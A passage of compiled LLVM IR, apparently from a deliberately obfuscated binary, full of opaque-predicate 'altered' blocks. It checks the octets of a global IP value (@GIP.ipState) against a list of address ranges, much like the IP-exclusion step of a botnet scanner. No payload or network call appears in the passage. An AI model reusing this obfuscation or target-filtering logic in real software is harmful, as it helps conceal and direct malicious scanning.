  %3385 = icmp eq i32 %3384, 74
  br i1 %3385, label %3386, label %3430

; <label>:3386:                                   ; preds = %3382
  %3387 = load i32, i32* @x.71
  %3388 = load i32, i32* @y.72
  %3389 = sub i32 %3387, 1
  %3390 = mul i32 %3387, %3389
  %3391 = urem i32 %3390, 2
  %3392 = icmp eq i32 %3391, 0
  %3393 = icmp slt i32 %3388, 10
  %3394 = or i1 %3392, %3393
  br i1 %3394, label %originalBB465, label %originalBB465alteredBB

originalBB465:                                    ; preds = %originalBB465alteredBB, %3386
  %3395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3396 = zext i8 %3395 to i32
  %3397 = icmp eq i32 %3396, 91
  %3398 = load i32, i32* @x.71
  %3399 = load i32, i32* @y.72
  %3400 = sub i32 %3398, 1
  %3401 = mul i32 %3398, %3400
  %3402 = urem i32 %3401, 2
  %3403 = icmp eq i32 %3402, 0
  %3404 = icmp slt i32 %3399, 10
  %3405 = or i1 %3403, %3404
  br i1 %3405, label %originalBBpart2467, label %originalBB465alteredBB

originalBBpart2467:                               ; preds = %originalBB465
  br i1 %3397, label %3406, label %3430

; <label>:3406:                                   ; preds = %originalBBpart2467
  %3407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3408 = zext i8 %3407 to i32
  %3409 = icmp sge i32 %3408, 113
  br i1 %3409, label %3410, label %3430

; <label>:3410:                                   ; preds = %3406
  %3411 = load i32, i32* @x.71
  %3412 = load i32, i32* @y.72
  %3413 = sub i32 %3411, 1
  %3414 = mul i32 %3411, %3413
  %3415 = urem i32 %3414, 2
  %3416 = icmp eq i32 %3415, 0
  %3417 = icmp slt i32 %3412, 10
  %3418 = or i1 %3416, %3417
  br i1 %3418, label %originalBB469, label %originalBB469alteredBB

originalBB469:                                    ; preds = %originalBB469alteredBB, %3410
  %3419 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3420 = zext i8 %3419 to i32
  %3421 = icmp slt i32 %3420, 115
  %3422 = load i32, i32* @x.71
  %3423 = load i32, i32* @y.72
  %3424 = sub i32 %3422, 1
  %3425 = mul i32 %3422, %3424
  %3426 = urem i32 %3425, 2
  %3427 = icmp eq i32 %3426, 0
  %3428 = icmp slt i32 %3423, 10
  %3429 = or i1 %3427, %3428
  br i1 %3429, label %originalBBpart2471, label %originalBB469alteredBB

originalBBpart2471:                               ; preds = %originalBB469
  br i1 %3421, label %5234, label %3430

; <label>:3430:                                   ; preds = %originalBBpart2471, %3406, %originalBBpart2467, %3382
  %3431 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3432 = zext i8 %3431 to i32
  %3433 = icmp eq i32 %3432, 74
  br i1 %3433, label %3434, label %3446

; <label>:3434:                                   ; preds = %3430
  %3435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3436 = zext i8 %3435 to i32
  %3437 = icmp eq i32 %3436, 201
  br i1 %3437, label %3438, label %3446

; <label>:3438:                                   ; preds = %3434
  %3439 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3440 = zext i8 %3439 to i32
  %3441 = icmp sge i32 %3440, 56
  br i1 %3441, label %3442, label %3446

; <label>:3442:                                   ; preds = %3438
  %3443 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3444 = zext i8 %3443 to i32
  %3445 = icmp slt i32 %3444, 58
  br i1 %3445, label %5234, label %3446

; <label>:3446:                                   ; preds = %3442, %3438, %3434, %3430
  %3447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3448 = zext i8 %3447 to i32
  %3449 = icmp eq i32 %3448, 188
  br i1 %3449, label %3450, label %3478

; <label>:3450:                                   ; preds = %3446
  %3451 = load i32, i32* @x.71
  %3452 = load i32, i32* @y.72
  %3453 = sub i32 %3451, 1
  %3454 = mul i32 %3451, %3453
  %3455 = urem i32 %3454, 2
  %3456 = icmp eq i32 %3455, 0
  %3457 = icmp slt i32 %3452, 10
  %3458 = or i1 %3456, %3457
  br i1 %3458, label %originalBB473, label %originalBB473alteredBB

originalBB473:                                    ; preds = %originalBB473alteredBB, %3450
  %3459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3460 = zext i8 %3459 to i32
  %3461 = icmp eq i32 %3460, 209
  %3462 = load i32, i32* @x.71
  %3463 = load i32, i32* @y.72
  %3464 = sub i32 %3462, 1
  %3465 = mul i32 %3462, %3464
  %3466 = urem i32 %3465, 2
  %3467 = icmp eq i32 %3466, 0
  %3468 = icmp slt i32 %3463, 10
  %3469 = or i1 %3467, %3468
  br i1 %3469, label %originalBBpart2475, label %originalBB473alteredBB

originalBBpart2475:                               ; preds = %originalBB473
  br i1 %3461, label %3470, label %3478

; <label>:3470:                                   ; preds = %originalBBpart2475
  %3471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3472 = zext i8 %3471 to i32
  %3473 = icmp sge i32 %3472, 48
  br i1 %3473, label %3474, label %3478

; <label>:3474:                                   ; preds = %3470
  %3475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3476 = zext i8 %3475 to i32
  %3477 = icmp slt i32 %3476, 53
  br i1 %3477, label %5234, label %3478

; <label>:3478:                                   ; preds = %3474, %3470, %originalBBpart2475, %3446
  %3479 = load i32, i32* @x.71
  %3480 = load i32, i32* @y.72
  %3481 = sub i32 %3479, 1
  %3482 = mul i32 %3479, %3481
  %3483 = urem i32 %3482, 2
  %3484 = icmp eq i32 %3483, 0
  %3485 = icmp slt i32 %3480, 10
  %3486 = or i1 %3484, %3485
  br i1 %3486, label %originalBB477, label %originalBB477alteredBB

originalBB477:                                    ; preds = %originalBB477alteredBB, %3478
  %3487 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3488 = zext i8 %3487 to i32
  %3489 = icmp eq i32 %3488, 188
  %3490 = load i32, i32* @x.71
  %3491 = load i32, i32* @y.72
  %3492 = sub i32 %3490, 1
  %3493 = mul i32 %3490, %3492
  %3494 = urem i32 %3493, 2
  %3495 = icmp eq i32 %3494, 0
  %3496 = icmp slt i32 %3491, 10
  %3497 = or i1 %3495, %3496
  br i1 %3497, label %originalBBpart2479, label %originalBB477alteredBB

originalBBpart2479:                               ; preds = %originalBB477
  br i1 %3489, label %3498, label %3518

; <label>:3498:                                   ; preds = %originalBBpart2479
  %3499 = load i32, i32* @x.71
  %3500 = load i32, i32* @y.72
  %3501 = sub i32 %3499, 1
  %3502 = mul i32 %3499, %3501
  %3503 = urem i32 %3502, 2
  %3504 = icmp eq i32 %3503, 0
  %3505 = icmp slt i32 %3500, 10
  %3506 = or i1 %3504, %3505
  br i1 %3506, label %originalBB481, label %originalBB481alteredBB

originalBB481:                                    ; preds = %originalBB481alteredBB, %3498
  %3507 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3508 = zext i8 %3507 to i32
  %3509 = icmp eq i32 %3508, 165
  %3510 = load i32, i32* @x.71
  %3511 = load i32, i32* @y.72
  %3512 = sub i32 %3510, 1
  %3513 = mul i32 %3510, %3512
  %3514 = urem i32 %3513, 2
  %3515 = icmp eq i32 %3514, 0
  %3516 = icmp slt i32 %3511, 10
  %3517 = or i1 %3515, %3516
  br i1 %3517, label %originalBBpart2483, label %originalBB481alteredBB

originalBBpart2483:                               ; preds = %originalBB481
  br i1 %3509, label %5234, label %3518

; <label>:3518:                                   ; preds = %originalBBpart2483, %originalBBpart2479
  %3519 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3520 = zext i8 %3519 to i32
  %3521 = icmp eq i32 %3520, 149
  br i1 %3521, label %3522, label %3526

; <label>:3522:                                   ; preds = %3518
  %3523 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3524 = zext i8 %3523 to i32
  %3525 = icmp eq i32 %3524, 202
  br i1 %3525, label %5234, label %3526

; <label>:3526:                                   ; preds = %3522, %3518
  %3527 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3528 = zext i8 %3527 to i32
  %3529 = icmp eq i32 %3528, 151
  br i1 %3529, label %3530, label %3550

; <label>:3530:                                   ; preds = %3526
  %3531 = load i32, i32* @x.71
  %3532 = load i32, i32* @y.72
  %3533 = sub i32 %3531, 1
  %3534 = mul i32 %3531, %3533
  %3535 = urem i32 %3534, 2
  %3536 = icmp eq i32 %3535, 0
  %3537 = icmp slt i32 %3532, 10
  %3538 = or i1 %3536, %3537
  br i1 %3538, label %originalBB485, label %originalBB485alteredBB

originalBB485:                                    ; preds = %originalBB485alteredBB, %3530
  %3539 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3540 = zext i8 %3539 to i32
  %3541 = icmp eq i32 %3540, 80
  %3542 = load i32, i32* @x.71
  %3543 = load i32, i32* @y.72
  %3544 = sub i32 %3542, 1
  %3545 = mul i32 %3542, %3544
  %3546 = urem i32 %3545, 2
  %3547 = icmp eq i32 %3546, 0
  %3548 = icmp slt i32 %3543, 10
  %3549 = or i1 %3547, %3548
  br i1 %3549, label %originalBBpart2487, label %originalBB485alteredBB

originalBBpart2487:                               ; preds = %originalBB485
  br i1 %3541, label %5234, label %3550

; <label>:3550:                                   ; preds = %originalBBpart2487, %3526
  %3551 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3552 = zext i8 %3551 to i32
  %3553 = icmp eq i32 %3552, 164
  br i1 %3553, label %3554, label %3558

; <label>:3554:                                   ; preds = %3550
  %3555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3556 = zext i8 %3555 to i32
  %3557 = icmp eq i32 %3556, 132
  br i1 %3557, label %5234, label %3558

; <label>:3558:                                   ; preds = %3554, %3550
  %3559 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3560 = zext i8 %3559 to i32
  %3561 = icmp eq i32 %3560, 176
  br i1 %3561, label %3562, label %3566

; <label>:3562:                                   ; preds = %3558
  %3563 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3564 = zext i8 %3563 to i32
  %3565 = icmp eq i32 %3564, 31
  br i1 %3565, label %5234, label %3566

; <label>:3566:                                   ; preds = %3562, %3558
  %3567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3568 = zext i8 %3567 to i32
  %3569 = icmp eq i32 %3568, 167
  br i1 %3569, label %3570, label %3574

; <label>:3570:                                   ; preds = %3566
  %3571 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3572 = zext i8 %3571 to i32
  %3573 = icmp eq i32 %3572, 114
  br i1 %3573, label %5234, label %3574

; <label>:3574:                                   ; preds = %3570, %3566
  %3575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3576 = zext i8 %3575 to i32
  %3577 = icmp eq i32 %3576, 178
  br i1 %3577, label %3578, label %3582

; <label>:3578:                                   ; preds = %3574
  %3579 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3580 = zext i8 %3579 to i32
  %3581 = icmp eq i32 %3580, 32
  br i1 %3581, label %5234, label %3582

; <label>:3582:                                   ; preds = %3578, %3574
  %3583 = load i32, i32* @x.71
  %3584 = load i32, i32* @y.72
  %3585 = sub i32 %3583, 1
  %3586 = mul i32 %3583, %3585
  %3587 = urem i32 %3586, 2
  %3588 = icmp eq i32 %3587, 0
  %3589 = icmp slt i32 %3584, 10
  %3590 = or i1 %3588, %3589
  br i1 %3590, label %originalBB489, label %originalBB489alteredBB

originalBB489:                                    ; preds = %originalBB489alteredBB, %3582
  %3591 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3592 = zext i8 %3591 to i32
  %3593 = icmp eq i32 %3592, 178
  %3594 = load i32, i32* @x.71
  %3595 = load i32, i32* @y.72
  %3596 = sub i32 %3594, 1
  %3597 = mul i32 %3594, %3596
  %3598 = urem i32 %3597, 2
  %3599 = icmp eq i32 %3598, 0
  %3600 = icmp slt i32 %3595, 10
  %3601 = or i1 %3599, %3600
  br i1 %3601, label %originalBBpart2491, label %originalBB489alteredBB

originalBBpart2491:                               ; preds = %originalBB489
  br i1 %3593, label %3602, label %3606

; <label>:3602:                                   ; preds = %originalBBpart2491
  %3603 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3604 = zext i8 %3603 to i32
  %3605 = icmp eq i32 %3604, 33
  br i1 %3605, label %5234, label %3606

; <label>:3606:                                   ; preds = %3602, %originalBBpart2491
  %3607 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3608 = zext i8 %3607 to i32
  %3609 = icmp eq i32 %3608, 37
  br i1 %3609, label %3610, label %3614

; <label>:3610:                                   ; preds = %3606
  %3611 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3612 = zext i8 %3611 to i32
  %3613 = icmp eq i32 %3612, 59
  br i1 %3613, label %5234, label %3614

; <label>:3614:                                   ; preds = %3610, %3606
  %3615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3616 = zext i8 %3615 to i32
  %3617 = icmp eq i32 %3616, 37
  br i1 %3617, label %3618, label %3622

; <label>:3618:                                   ; preds = %3614
  %3619 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3620 = zext i8 %3619 to i32
  %3621 = icmp eq i32 %3620, 187
  br i1 %3621, label %5234, label %3622

; <label>:3622:                                   ; preds = %3618, %3614
  %3623 = load i32, i32* @x.71
  %3624 = load i32, i32* @y.72
  %3625 = sub i32 %3623, 1
  %3626 = mul i32 %3623, %3625
  %3627 = urem i32 %3626, 2
  %3628 = icmp eq i32 %3627, 0
  %3629 = icmp slt i32 %3624, 10
  %3630 = or i1 %3628, %3629
  br i1 %3630, label %originalBB493, label %originalBB493alteredBB

originalBB493:                                    ; preds = %originalBB493alteredBB, %3622
  %3631 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3632 = zext i8 %3631 to i32
  %3633 = icmp eq i32 %3632, 46
  %3634 = load i32, i32* @x.71
  %3635 = load i32, i32* @y.72
  %3636 = sub i32 %3634, 1
  %3637 = mul i32 %3634, %3636
  %3638 = urem i32 %3637, 2
  %3639 = icmp eq i32 %3638, 0
  %3640 = icmp slt i32 %3635, 10
  %3641 = or i1 %3639, %3640
  br i1 %3641, label %originalBBpart2495, label %originalBB493alteredBB

originalBBpart2495:                               ; preds = %originalBB493
  br i1 %3633, label %3642, label %3662

; <label>:3642:                                   ; preds = %originalBBpart2495
  %3643 = load i32, i32* @x.71
  %3644 = load i32, i32* @y.72
  %3645 = sub i32 %3643, 1
  %3646 = mul i32 %3643, %3645
  %3647 = urem i32 %3646, 2
  %3648 = icmp eq i32 %3647, 0
  %3649 = icmp slt i32 %3644, 10
  %3650 = or i1 %3648, %3649
  br i1 %3650, label %originalBB497, label %originalBB497alteredBB

originalBB497:                                    ; preds = %originalBB497alteredBB, %3642
  %3651 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3652 = zext i8 %3651 to i32
  %3653 = icmp eq i32 %3652, 105
  %3654 = load i32, i32* @x.71
  %3655 = load i32, i32* @y.72
  %3656 = sub i32 %3654, 1
  %3657 = mul i32 %3654, %3656
  %3658 = urem i32 %3657, 2
  %3659 = icmp eq i32 %3658, 0
  %3660 = icmp slt i32 %3655, 10
  %3661 = or i1 %3659, %3660
  br i1 %3661, label %originalBBpart2499, label %originalBB497alteredBB

originalBBpart2499:                               ; preds = %originalBB497
  br i1 %3653, label %5234, label %3662

; <label>:3662:                                   ; preds = %originalBBpart2499, %originalBBpart2495
  %3663 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3664 = zext i8 %3663 to i32
  %3665 = icmp eq i32 %3664, 51
  br i1 %3665, label %3666, label %3686

; <label>:3666:                                   ; preds = %3662
  %3667 = load i32, i32* @x.71
  %3668 = load i32, i32* @y.72
  %3669 = sub i32 %3667, 1
  %3670 = mul i32 %3667, %3669
  %3671 = urem i32 %3670, 2
  %3672 = icmp eq i32 %3671, 0
  %3673 = icmp slt i32 %3668, 10
  %3674 = or i1 %3672, %3673
  br i1 %3674, label %originalBB501, label %originalBB501alteredBB

originalBB501:                                    ; preds = %originalBB501alteredBB, %3666
  %3675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3676 = zext i8 %3675 to i32
  %3677 = icmp eq i32 %3676, 254
  %3678 = load i32, i32* @x.71
  %3679 = load i32, i32* @y.72
  %3680 = sub i32 %3678, 1
  %3681 = mul i32 %3678, %3680
  %3682 = urem i32 %3681, 2
  %3683 = icmp eq i32 %3682, 0
  %3684 = icmp slt i32 %3679, 10
  %3685 = or i1 %3683, %3684
  br i1 %3685, label %originalBBpart2503, label %originalBB501alteredBB

originalBBpart2503:                               ; preds = %originalBB501
  br i1 %3677, label %5234, label %3686

; <label>:3686:                                   ; preds = %originalBBpart2503, %3662
  %3687 = load i32, i32* @x.71
  %3688 = load i32, i32* @y.72
  %3689 = sub i32 %3687, 1
  %3690 = mul i32 %3687, %3689
  %3691 = urem i32 %3690, 2
  %3692 = icmp eq i32 %3691, 0
  %3693 = icmp slt i32 %3688, 10
  %3694 = or i1 %3692, %3693
  br i1 %3694, label %originalBB505, label %originalBB505alteredBB

originalBB505:                                    ; preds = %originalBB505alteredBB, %3686
  %3695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3696 = zext i8 %3695 to i32
  %3697 = icmp eq i32 %3696, 51
  %3698 = load i32, i32* @x.71
  %3699 = load i32, i32* @y.72
  %3700 = sub i32 %3698, 1
  %3701 = mul i32 %3698, %3700
  %3702 = urem i32 %3701, 2
  %3703 = icmp eq i32 %3702, 0
  %3704 = icmp slt i32 %3699, 10
  %3705 = or i1 %3703, %3704
  br i1 %3705, label %originalBBpart2507, label %originalBB505alteredBB

originalBBpart2507:                               ; preds = %originalBB505
  br i1 %3697, label %3706, label %3710

; <label>:3706:                                   ; preds = %originalBBpart2507
  %3707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3708 = zext i8 %3707 to i32
  %3709 = icmp eq i32 %3708, 255
  br i1 %3709, label %5234, label %3710

; <label>:3710:                                   ; preds = %3706, %originalBBpart2507
  %3711 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3712 = zext i8 %3711 to i32
  %3713 = icmp eq i32 %3712, 5
  br i1 %3713, label %3714, label %3718

; <label>:3714:                                   ; preds = %3710
  %3715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3716 = zext i8 %3715 to i32
  %3717 = icmp eq i32 %3716, 135
  br i1 %3717, label %5234, label %3718

; <label>:3718:                                   ; preds = %3714, %3710
  %3719 = load i32, i32* @x.71
  %3720 = load i32, i32* @y.72
  %3721 = sub i32 %3719, 1
  %3722 = mul i32 %3719, %3721
  %3723 = urem i32 %3722, 2
  %3724 = icmp eq i32 %3723, 0
  %3725 = icmp slt i32 %3720, 10
  %3726 = or i1 %3724, %3725
  br i1 %3726, label %originalBB509, label %originalBB509alteredBB

originalBB509:                                    ; preds = %originalBB509alteredBB, %3718
  %3727 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3728 = zext i8 %3727 to i32
  %3729 = icmp eq i32 %3728, 5
  %3730 = load i32, i32* @x.71
  %3731 = load i32, i32* @y.72
  %3732 = sub i32 %3730, 1
  %3733 = mul i32 %3730, %3732
  %3734 = urem i32 %3733, 2
  %3735 = icmp eq i32 %3734, 0
  %3736 = icmp slt i32 %3731, 10
  %3737 = or i1 %3735, %3736
  br i1 %3737, label %originalBBpart2511, label %originalBB509alteredBB

originalBBpart2511:                               ; preds = %originalBB509
  br i1 %3729, label %3738, label %3758

; <label>:3738:                                   ; preds = %originalBBpart2511
  %3739 = load i32, i32* @x.71
  %3740 = load i32, i32* @y.72
  %3741 = sub i32 %3739, 1
  %3742 = mul i32 %3739, %3741
  %3743 = urem i32 %3742, 2
  %3744 = icmp eq i32 %3743, 0
  %3745 = icmp slt i32 %3740, 10
  %3746 = or i1 %3744, %3745
  br i1 %3746, label %originalBB513, label %originalBB513alteredBB

originalBB513:                                    ; preds = %originalBB513alteredBB, %3738
  %3747 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3748 = zext i8 %3747 to i32
  %3749 = icmp eq i32 %3748, 196
  %3750 = load i32, i32* @x.71
  %3751 = load i32, i32* @y.72
  %3752 = sub i32 %3750, 1
  %3753 = mul i32 %3750, %3752
  %3754 = urem i32 %3753, 2
  %3755 = icmp eq i32 %3754, 0
  %3756 = icmp slt i32 %3751, 10
  %3757 = or i1 %3755, %3756
  br i1 %3757, label %originalBBpart2515, label %originalBB513alteredBB

originalBBpart2515:                               ; preds = %originalBB513
  br i1 %3749, label %5234, label %3758

; <label>:3758:                                   ; preds = %originalBBpart2515, %originalBBpart2511
  %3759 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3760 = zext i8 %3759 to i32
  %3761 = icmp eq i32 %3760, 5
  br i1 %3761, label %3762, label %3766

; <label>:3762:                                   ; preds = %3758
  %3763 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3764 = zext i8 %3763 to i32
  %3765 = icmp eq i32 %3764, 39
  br i1 %3765, label %5234, label %3766

; <label>:3766:                                   ; preds = %3762, %3758
  %3767 = load i32, i32* @x.71
  %3768 = load i32, i32* @y.72
  %3769 = sub i32 %3767, 1
  %3770 = mul i32 %3767, %3769
  %3771 = urem i32 %3770, 2
  %3772 = icmp eq i32 %3771, 0
  %3773 = icmp slt i32 %3768, 10
  %3774 = or i1 %3772, %3773
  br i1 %3774, label %originalBB517, label %originalBB517alteredBB

originalBB517:                                    ; preds = %originalBB517alteredBB, %3766
  %3775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3776 = zext i8 %3775 to i32
  %3777 = icmp eq i32 %3776, 91
  %3778 = load i32, i32* @x.71
  %3779 = load i32, i32* @y.72
  %3780 = sub i32 %3778, 1
  %3781 = mul i32 %3778, %3780
  %3782 = urem i32 %3781, 2
  %3783 = icmp eq i32 %3782, 0
  %3784 = icmp slt i32 %3779, 10
  %3785 = or i1 %3783, %3784
  br i1 %3785, label %originalBBpart2519, label %originalBB517alteredBB

originalBBpart2519:                               ; preds = %originalBB517
  br i1 %3777, label %3786, label %3790

; <label>:3786:                                   ; preds = %originalBBpart2519
  %3787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3788 = zext i8 %3787 to i32
  %3789 = icmp eq i32 %3788, 134
  br i1 %3789, label %5234, label %3790

; <label>:3790:                                   ; preds = %3786, %originalBBpart2519
  %3791 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3792 = zext i8 %3791 to i32
  %3793 = icmp eq i32 %3792, 104
  br i1 %3793, label %3794, label %3838

; <label>:3794:                                   ; preds = %3790
  %3795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3796 = zext i8 %3795 to i32
  %3797 = icmp eq i32 %3796, 200
  br i1 %3797, label %3798, label %3838

; <label>:3798:                                   ; preds = %3794
  %3799 = load i32, i32* @x.71
  %3800 = load i32, i32* @y.72
  %3801 = sub i32 %3799, 1
  %3802 = mul i32 %3799, %3801
  %3803 = urem i32 %3802, 2
  %3804 = icmp eq i32 %3803, 0
  %3805 = icmp slt i32 %3800, 10
  %3806 = or i1 %3804, %3805
  br i1 %3806, label %originalBB521, label %originalBB521alteredBB

originalBB521:                                    ; preds = %originalBB521alteredBB, %3798
  %3807 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3808 = zext i8 %3807 to i32
  %3809 = icmp sge i32 %3808, 128
  %3810 = load i32, i32* @x.71
  %3811 = load i32, i32* @y.72
  %3812 = sub i32 %3810, 1
  %3813 = mul i32 %3810, %3812
  %3814 = urem i32 %3813, 2
  %3815 = icmp eq i32 %3814, 0
  %3816 = icmp slt i32 %3811, 10
  %3817 = or i1 %3815, %3816
  br i1 %3817, label %originalBBpart2523, label %originalBB521alteredBB

originalBBpart2523:                               ; preds = %originalBB521
  br i1 %3809, label %3818, label %3838

; <label>:3818:                                   ; preds = %originalBBpart2523
  %3819 = load i32, i32* @x.71
  %3820 = load i32, i32* @y.72
  %3821 = sub i32 %3819, 1
  %3822 = mul i32 %3819, %3821
  %3823 = urem i32 %3822, 2
  %3824 = icmp eq i32 %3823, 0
  %3825 = icmp slt i32 %3820, 10
  %3826 = or i1 %3824, %3825
  br i1 %3826, label %originalBB525, label %originalBB525alteredBB

originalBB525:                                    ; preds = %originalBB525alteredBB, %3818
  %3827 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3828 = zext i8 %3827 to i32
  %3829 = icmp slt i32 %3828, 159
  %3830 = load i32, i32* @x.71
  %3831 = load i32, i32* @y.72
  %3832 = sub i32 %3830, 1
  %3833 = mul i32 %3830, %3832
  %3834 = urem i32 %3833, 2
  %3835 = icmp eq i32 %3834, 0
  %3836 = icmp slt i32 %3831, 10
  %3837 = or i1 %3835, %3836
  br i1 %3837, label %originalBBpart2527, label %originalBB525alteredBB

originalBBpart2527:                               ; preds = %originalBB525
  br i1 %3829, label %5234, label %3838

; <label>:3838:                                   ; preds = %originalBBpart2527, %originalBBpart2523, %3794, %3790
  %3839 = load i32, i32* @x.71
  %3840 = load i32, i32* @y.72
  %3841 = sub i32 %3839, 1
  %3842 = mul i32 %3839, %3841
  %3843 = urem i32 %3842, 2
  %3844 = icmp eq i32 %3843, 0
  %3845 = icmp slt i32 %3840, 10
  %3846 = or i1 %3844, %3845
  br i1 %3846, label %originalBB529, label %originalBB529alteredBB

originalBB529:                                    ; preds = %originalBB529alteredBB, %3838
  %3847 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3848 = zext i8 %3847 to i32
  %3849 = icmp eq i32 %3848, 107
  %3850 = load i32, i32* @x.71
  %3851 = load i32, i32* @y.72
  %3852 = sub i32 %3850, 1
  %3853 = mul i32 %3850, %3852
  %3854 = urem i32 %3853, 2
  %3855 = icmp eq i32 %3854, 0
  %3856 = icmp slt i32 %3851, 10
  %3857 = or i1 %3855, %3856
  br i1 %3857, label %originalBBpart2531, label %originalBB529alteredBB

originalBBpart2531:                               ; preds = %originalBB529
  br i1 %3849, label %3858, label %3902

; <label>:3858:                                   ; preds = %originalBBpart2531
  %3859 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3860 = zext i8 %3859 to i32
  %3861 = icmp eq i32 %3860, 152
  br i1 %3861, label %3862, label %3902

; <label>:3862:                                   ; preds = %3858
  %3863 = load i32, i32* @x.71
  %3864 = load i32, i32* @y.72
  %3865 = sub i32 %3863, 1
  %3866 = mul i32 %3863, %3865
  %3867 = urem i32 %3866, 2
  %3868 = icmp eq i32 %3867, 0
  %3869 = icmp slt i32 %3864, 10
  %3870 = or i1 %3868, %3869
  br i1 %3870, label %originalBB533, label %originalBB533alteredBB

originalBB533:                                    ; preds = %originalBB533alteredBB, %3862
  %3871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3872 = zext i8 %3871 to i32
  %3873 = icmp sge i32 %3872, 96
  %3874 = load i32, i32* @x.71
  %3875 = load i32, i32* @y.72
  %3876 = sub i32 %3874, 1
  %3877 = mul i32 %3874, %3876
  %3878 = urem i32 %3877, 2
